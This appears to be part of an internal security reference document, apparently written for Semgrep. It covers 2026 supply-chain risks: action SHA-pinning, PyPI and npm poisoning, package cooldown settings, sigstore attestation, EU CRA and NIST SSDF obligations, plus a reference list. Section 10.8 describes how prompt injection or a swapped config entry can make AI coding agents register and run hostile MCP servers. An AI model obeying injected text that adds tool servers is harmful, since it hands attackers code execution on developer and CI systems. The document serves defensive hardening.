### 10.3 `tj-actions/changed-files` Mar 2025 anniversary status

One year after CVE-2025-30066 (the canonical action-tag-mutation incident, Mar 14-15 2025), the ecosystem-wide SHA-pinning adoption picture in 2026 H1 is uneven. StepSecurity's published telemetry (`https://www.stepsecurity.io/blog`) shows that among repos using `step-security/harden-runner`, SHA-pinning of third-party actions is now near-universal — but the harden-runner-adopting cohort is self-selected and not representative. Renovate (`docker.io/renovate/renovate`) and Dependabot both shipped action-SHA-pinning support before the incident. Since Aug 15 2025 the allowed-actions policy has an opt-in checkbox that requires full commit SHAs and fails any workflow using an unpinned action; CodeQL's `actions/unpinned-tag` query (security-extended suite) flags tag-referenced third-party actions. Required Reviewers for `.github/workflows/` changes via CODEOWNERS exists but is opt-in; published surveys of public repos still find the majority of workflows using `@v4`-style mutable refs [unverified — no single authoritative 2026 H1 ecosystem-wide measurement; multiple vendor blogs cite their own customer telemetry but none publish methodology]. Operational read for 2026 H1: tag-pinning is still the de facto ecosystem default; SHA-pinning remains an opt-in control, not a platform default.

### 10.4 PyPI poisoning batches 2026 H1

PyPI's 2FA mandate (effective Jan 1 2024 for all users, per `https://blog.pypi.org/`) has measurably *raised the cost* of maintainer-account-takeover but not eliminated it; 2026 H1 disclosures concentrate in three classes: (1) typosquatting and dependency-confusion (the structural shape unchanged since 2017), (2) malicious-update-via-stolen-maintainer-credential (now requires either 2FA bypass or session-token theft, often via attacker-controlled extensions in the maintainer's IDE — connecting back to §2.10 AI-action-as-dependency), and (3) supply-chain-via-CI compromise on the maintainer's release workflow (the most successful 2026 H1 shape). Specific incidents documented in 2026 H1 vendor disclosure feeds: ReversingLabs continued malicious-package reports through Jan-May 2026 (`https://www.reversinglabs.com/blog`; Phylum's technology assets were acquired by Veracode in Jan 2025), with Sonatype's 2026 *State of the Software Supply Chain* report — published Jan 28 2026 — reporting a ~75% year-over-year rise in newly identified malicious open-source packages. The `cline@2.3.0` npm publish (Clinejection chain, §2.9) is structurally the same shape applied to npm: CI-compromise → token-exfil → registry publish. The threat-model lesson: registry-side 2FA closed the front door, so the attack surface shifted to the maintainer's CI release pipeline as the soft target.

### 10.5 npm registry poisoning 2026 H1

npm's 2023 provenance GA (`https://blog.sigstore.dev/npm-provenance-ga/`) and the cooldown-via-`min-release-age` (in `.npmrc`) are the two structural defenses; adoption of both rose modestly through 2026 H1 [unverified — no central published npm metric for `min-release-age` adoption; provenance attestation rates are queryable via `npm view <pkg> --json` for individual packages but the registry does not publish an aggregate adoption percentage]. 2026 H1 named npm incidents include the `cline@2.3.0` publish (Feb 2026; see §2.9 + GHSA-9ppg-jx86-fqw7), the continued steady drumbeat of Socket / Snyk / Sonatype weekly malicious-package writeups (`https://socket.dev/blog`, `https://snyk.io/blog/`), and the `lottie-player` and `solana/web3.js` patterns continuing into 2026 H1 variants (typosquats and short-lived hijacked-maintainer-account publishes that ride registry latency for a few hours before takedown). The structural lesson restated: cooldowns work *only* if the registry consumer enforces them on install (`min-release-age` in `.npmrc`, `minimumReleaseAge` in `pnpm-workspace.yaml`, `npmMinimalAgeGate` in `yarnrc.yml`); the registry itself does not yet impose a publish-to-install gating window.

### 10.6 `min-release-age` adoption across package managers

Package-manager-side cooldown support as of May 2026:

| Package manager | Setting | File | Status |
|---|---|---|---|
| npm | `min-release-age` | `.npmrc` | Shipped Feb 2026 (npm CLI 11.10.0); still opt-in per-project |
| pnpm | `minimumReleaseAge` (minutes) | `pnpm-workspace.yaml` | Shipped 2025 (pnpm 10.16); opt-in |
| Yarn (Berry) | `npmMinimalAgeGate` (minutes; duration strings such as `"1w"` from 4.11) | `.yarnrc.yml` | Shipped 2025 (Yarn 4.10); opt-in |
| uv | `exclude-newer = "<duration>"` | `pyproject.toml` / `uv.toml` | Duration form shipped Dec 2025; opt-in |
| Dependabot | `cooldown: default-days:` | `.github/dependabot.yml` | Shipped Jul 2025; opt-in per-update-entry |

Empirical adoption rates per registry are not centrally published [unverified — neither npm nor PyPI publishes an aggregate `min-release-age` opt-in percentage; the best public signal is the GitHub code-search rate for the relevant setting strings, which is a lower bound, not a measurement]. Semgrep's org-wide policy (`/Library/Application Support/ClaudeCode/CLAUDE.md`, mandatory in all new package-manager manifests Claude Code authors) requires the 7-day setting on the four package-manager mechanisms above (npm, pnpm, Yarn, uv) as the org-side baseline. The 2026 H1 read: the cooldown is *necessary* on any net-new manifest and *not yet sufficient* as a defense — the maintainer-credential-theft → publish → wait-7-days → consumer-installs shape is defeated only when the credential theft is detected and revoked inside the 7-day window, which depends on the maintainer's own monitoring (npm publish notifications, GitHub Security tab on the publishing repo).

### 10.7 sigstore + in-toto operational adoption 2026 H1

sigstore's transparency log (`https://search.sigstore.dev/`) and the public Rekor instance are the load-bearing observability layer. As of May 2026 the practical adoption picture: (a) **GitHub Artifact Attestations** (`actions/attest-build-provenance`, shipped 2024) is the easiest on-ramp and has measurable adoption among GitHub-hosted release pipelines, particularly in Linux-distro packaging workflows and large OSS projects (Kubernetes, Envoy, Istio publish attestations); (b) **npm sigstore-powered provenance** (`https://blog.sigstore.dev/npm-provenance-ga/`) is opt-in per-publish via `npm publish --provenance` (automatic under trusted publishing since Jul 2025) and adoption is correlated with whether the package is published from a supported cloud CI (GitHub Actions or GitLab CI/CD); (c) **Docker image signing** via `cosign` is widespread among security-focused vendors (Chainguard, Wolfi, Distroless, Sigstore's own images) but rare outside that cohort; (d) **SLSA L2/L3 attestation** is concentrated in regulated-industry pipelines and the Chainguard/Wolfi/Distroless track; SLSA L1 ("there is a build process") is now the de facto floor for OSS projects but does not require attestation. The 2026 H1 inflection: GitHub Artifact Attestations' GA + npm provenance compound such that for *GitHub-hosted-and-published* OSS projects, the provenance story is now an opt-in checklist not a research project. For PyPI, digital attestations (PEP 740) shipped in Nov 2024 and became the default for Trusted Publishing via the PyPA GitHub publish action. Cross-link [[reference-supply-chain-provenance]] for the full SLSA/sigstore/in-toto/SBOM doctrine and 90-day adoption playbook.

### 10.8 MCP-server-as-supply-chain class — AI-tool extension to CI/CD attacks

When AI coding tools run in CI (the `claude-code-action`, `copilot-coding-agent`, `gemini-cli-action`, `cursor-agent` GitHub Action wrappers), the MCP server allowlist becomes a CI supply-chain control surface — every MCP server the agent can load is an additional dependency with execution authority. Canonical 2025 demonstrations: **MCPoison** / CVE-2025-54136 (Check Point Research, Aug 2025; `https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/`) — Cursor bound MCP approval to the config entry's key name, so an attacker who got a benign `mcp.json` entry approved could later swap its command and have it run silently, including on every project reopen. **CurXecute / CVE-2025-54135** (Aim Labs, Aug 2025; `https://www.aim.security/post/curxecute`) — prompt injection could steer Cursor's agent into writing `mcp.json` to register a new MCP server, which Cursor ran without confirmation, even before the user accepted or rejected the edit. Both shapes extend to CI: if a `claude-code-action` workflow allows tool-use that includes filesystem writes and reads `mcp.json` from the repo, the same primitive applies. The 2025-11-25 MCP spec ([[reference-llm-agent-security]] §10) keeps authorization optional (strongly recommended for remote servers), and the *allowlist* surface is policy-side and per-repo. The 2026 H1 operational lesson: treat the MCP server list as you would treat `dependencies` in `package.json` — version-pin (or commit-pin where the server is a git URL), allowlist explicitly (no `*` patterns), and rotate the allowlist through the same code-review path as any other CI supply-chain change. Cross-link [[reference-ai-assisted-coding-tool-security]] §§13-14 for the worked example with `mcp.json` allowlist patterns.

### 10.9 EU Cyber Resilience Act (CRA) supply-chain reporting requirements

Regulation EU 2024/2847 (CRA) entered force Dec 10 2024 (`https://digital-strategy.ec.europa.eu/en/policies/cyber-resilience-act`). The 2026 H1 status is *pre-enforcement* — the regulation applies, but the staggered compliance milestones land later: vulnerability and incident reporting obligations (Article 14) become enforceable Sep 11 2026; full product requirements (Articles 13, 14, Annex I) become enforceable Dec 11 2027. What manufacturers of "products with digital elements" need to be doing in 2026 H1 to meet the Sep 2026 enforcement: (a) stand up a vulnerability disclosure process with a documented intake (PSIRT or equivalent); (b) define the 24-hour early-warning notification path to ENISA for actively-exploited vulnerabilities (Art 14(2)(a)); (c) define the 72-hour formal notification path (Art 14(2)(b)); (d) maintain an SBOM for each product. The OpenSSF policy hub (`https://openssf.org/public-policy/eu-cyber-resilience-act/`) tracks the OSS-steward carve-out (Art 24) — open-source projects that meet the OSS-steward criteria have a softer regime than commercial manufacturers. For Semgrep specifically: the rules engine and the Assistant are both "products with digital elements" sold in the EU; CRA flow-down to suppliers (Annex I Part 1) means the supply-chain attestation requirements (SBOM, vulnerability tracking) become contractual rather than optional. The 2026 H1 operational read: if your product ships to EU customers and you don't already have a PSIRT + SBOM + ENISA-notification runbook, the Sep 2026 deadline is now in scope for planning.

### 10.10 NIST SSDF v1.1 + US EO 14028 / EO 14110 procurement language

NIST SP 800-218 (Secure Software Development Framework, SSDF v1.1; `https://csrc.nist.gov/Projects/ssdf`) and the federal-procurement attestation requirements that flow from Executive Order 14028 (May 2021) — formalized via OMB M-22-18 and M-23-16 — are the US analog to the CRA's supply-chain reporting layer. EO 14110 (Oct 2023, "Safe, Secure, and Trustworthy AI") added AI-specific procurement guidance; it was revoked on Jan 20 2025 by EO 14148. OMB M-26-05 (Jan 23 2026) rescinded M-22-18 and M-23-16, ending the mandatory collection of SSDF self-attestations from software producers; agencies now set risk-based software assurance policies and may still use the CISA Common Form or require an SBOM. The 2026 H1 operational read for Semgrep and similar B2B security vendors: SSDF self-attestation is now an agency-by-agency requirement rather than a government-wide precondition; the supply-chain controls in this doc (SHA-pinned actions, signed releases, SBOM, vulnerability disclosure) map directly to SSDF practices and the attestation language. The cross-link is [[reference-detection-engineering]] §11 for the runtime-side detection-engineering attestation requirements that complement the SSDF build-side controls.

---

## 11. References

### Primary research / writeups

- Adnan Khan, *Monsters in Your Build Cache* (May 2024): https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/
- Adnan Khan, *Cacheract* (Dec 2024): https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/
- Adnan Khan, *Clinejection* (Feb 2026): https://adnanthekhan.com/posts/clinejection/
- Cline, *Post-mortem: Unauthorized cline@2.3.0 npm publish* (Feb 2026): https://cline.bot/blog/post-mortem-unauthorized-cline-cli-npm
- Snyk, *How "Clinejection" Turned an AI Bot into a Supply Chain Attack* (Feb 2026): https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/
- GHSA-9ppg-jx86-fqw7 (Cline, Feb 19 2026): https://github.com/cline/cline/security/advisories/GHSA-9ppg-jx86-fqw7
- Adnan Khan + Praetorian, *Long Live the Pwn Request*: https://www.praetorian.com/blog/pwn-request-hacking-microsoft-github-repositories-and-more/
- Gato-X: https://github.com/AdnaneKhan/gato-x
- ActionsTOCTOU: https://github.com/AdnaneKhan/ActionsTOCTOU
- NCC Group, *10 real-world stories of how we've compromised CI/CD pipelines* (Smart, Gazdag et al., Jan 2022): https://research.nccgroup.com/2022/01/13/10-real-world-stories-of-how-weve-compromised-ci-cd-pipelines/
- Iain Smart's blog: https://blog.iainsmart.co.uk/
- Snyk Labs, *Call for action: Exploring vulnerabilities in Github Actions*: https://labs.snyk.io/resources/exploring-vulnerabilities-github-actions/
- GitHub Security Lab Part-4 (new patterns + mitigations): https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/
- GitHub Security Lab + CodeQL scanning guide: https://github.blog/security/application-security/how-to-secure-your-github-actions-workflows-with-codeql/
- Orca, *pull_request_nightmare Part 1*: https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/
- Legit Security, *Vulnerable GitHub Actions Workflows: Privilege Escalation*: https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability

### Defensive frameworks

- OWASP CI/CD Top 10 Security Risks: https://owasp.org/www-project-top-10-ci-cd-security-risks/
- OWASP CI/CD Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html
- SLSA v1.1: https://slsa.dev/
- Chainguard Academy SLSA intro: https://edu.chainguard.dev/compliance/slsa/what-is-slsa/
- sigstore: https://www.sigstore.dev/
- OpenSSF Scorecard checks: https://github.com/ossf/scorecard/blob/main/docs/checks.md
- step-security/harden-runner: https://github.com/step-security/harden-runner
- harden-runner docs: https://docs.stepsecurity.io/harden-runner
- GitHub Actions OIDC: https://docs.github.com/en/actions/concepts/security/openid-connect
- GitHub Actions secure-use reference: https://docs.github.com/en/actions/reference/security/secure-use

### Incident writeups

- CrowdStrike, *SUNSPOT Malware: A Technical Analysis*: https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/
- Mandiant, *SolarWinds Supply Chain Compromise*: https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor
- Codecov April 2021 post-mortem: https://about.codecov.io/apr-2021-post-mortem/
- Kaseya VSA ransomware attack (Wikipedia): https://en.wikipedia.org/wiki/Kaseya_VSA_ransomware_attack
- Tenable, CVE-2021-30116: https://www.tenable.com/blog/cve-2021-30116-multiple-zero-day-vulnerabilities-in-kaseya-vsa-exploited-to-distribute-ransomware
- Rapid7, ua-parser-js hijacked: https://www.rapid7.com/blog/post/2021/10/25/npm-library-ua-parser-js-hijacked-what-you-need-to-know/
- CircleCI Jan 4 2023 incident report: https://circleci.com/blog/jan-4-2023-incident-report/
- CircleCI security alert: https://circleci.com/blog/january-4-2023-security-alert/
- Mandiant, *3CX Supply Chain Compromise Initiated by a Prior Supply Chain Compromise*: https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise
- Krebs on Security, *3CX Breach Was a Double Supply Chain Compromise*: https://krebsonsecurity.com/2023/04/3cx-breach-was-a-double-supply-chain-compromise/
- Akamai, XZ Utils Backdoor: https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know
- XZ Utils backdoor (Wikipedia): https://en.wikipedia.org/wiki/XZ_Utils_backdoor
- Kaspersky Securelist, social engineering of XZ: https://securelist.com/xz-backdoor-story-part-2-social-engineering/112476/
- E.V.A, CocoaPods supply chain vulnerabilities: https://evasec.webflow.io/blog/eva-discovered-supply-chain-vulnerabities-in-cocoapods
- Semgrep, CocoaPods vulnerabilities highlight risks: https://semgrep.dev/blog/2024/cocoapods-vulnerabilities-highlight-risks-in-dependency-managers/
- Semgrep, tj-actions/changed-files is compromised (Boberg et al., Mar 2025): https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/
- StepSecurity, Harden-Runner detection of tj-actions: https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
- Wiz, CVE-2025-30066 tj-actions supply chain: https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066
- CISA, tj-actions / reviewdog (CVE-2025-30066/30154): https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction
- Unit 42, GitHub Actions Supply Chain Attack on Coinbase: https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/
- GHSA-mrrh-fwg8-r2c3 (CVE-2025-30066): https://github.com/advisories/ghsa-mrrh-fwg8-r2c3
- Mandiant, UNC5537 Snowflake: https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion
- Alex Birsan, *Dependency Confusion*: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- Sansec, *Polyfill supply chain attack* (Jun 2024): https://sansec.io/research/polyfill-supply-chain-attack
- Semgrep, *Protect your code from the Polyfill supply chain attack* (Jun 2024): https://semgrep.dev/blog/2024/protect-your-code-from-the-polyfill-supply-chain-attack/
- Snyk, *Lottie Player npm package compromised for crypto wallet theft* (Oct 2024): https://snyk.io/blog/lottie-player-npm-package-compromised-crypto-wallet-theft/
- Wiz, *Supply Chain Attack Targets JavaScript's Lottie-Player* (Oct 2024): https://www.wiz.io/blog/lottie-player-supply-chain-attack
- Solana Foundation GHSA-jcxm-7wvp-g6p5 (CVE-2024-54134, Dec 2024): https://github.com/solana-foundation/solana-web3.js/security/advisories/GHSA-jcxm-7wvp-g6p5
- The Hacker News, *Researchers Uncover Backdoor in Solana's Popular Web3.js npm Library* (Dec 2024): https://thehackernews.com/2024/12/researchers-uncover-backdoor-in-solanas.html
- PyPI Blog, *Supply-chain attack analysis: Ultralytics* (Dec 2024): https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/
- Wiz, *Ultralytics AI Library Hacked via GitHub for Cryptomining* (Dec 2024): https://www.wiz.io/blog/ultralytics-ai-library-hacked-via-github-for-cryptomining
- Socket, *Ultralytics PyPI Package Compromised Through GitHub Actions Cache Poisoning* (Dec 2024): https://socket.dev/blog/ultralytics-pypi-package-compromised-through-github-actions-cache-poisoning

### Provenance / attestations (current adoption state)

- Sigstore Blog, *npm's Sigstore-powered provenance goes GA* (Oct 2023): https://blog.sigstore.dev/npm-provenance-ga/
- InfoQ, *Provenance Tools Becoming Standard in Developer Platforms* (Aug 2025): https://www.infoq.com/news/2025/08/provenance/
- GitHub Docs, *Using artifact attestations to establish provenance for builds*: https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds
- `actions/attest-build-provenance`: https://github.com/actions/attest-build-provenance

### EU Cyber Resilience Act

- Regulation EU 2024/2847 (CRA, in force Dec 10 2024): https://digital-strategy.ec.europa.eu/en/policies/cyber-resilience-act
- OpenSSF, *EU Cyber Resilience Act* (policy hub, timeline + steward role): https://openssf.org/public-policy/eu-cyber-resilience-act/
- European Commission, *Cyber Resilience Act – Open source factpage*: https://digital-strategy.ec.europa.eu/en/policies/cra-open-source

### Internal cross-references

- `~/ai/CLAUDE.md` — organizational SHA-pinning + cooldown policy (org-managed `/Library/Application Support/ClaudeCode/CLAUDE.md` excerpts)
- `~/ai/expertise/software/container_k8s_security.md` — container/Kubernetes primitives for runner-pod and ARC threat modeling
- `~/ai/expertise/software/llm_agent_security_expertise.md` — agent-runtime threat model when AI coding tools commit workflow changes
- `~/ai/expertise/software/cryptography_expertise.md` — signing keys, signature verification, sigstore / cosign internals
- `reference_key_artifacts` memory — index of operating docs and existing rules
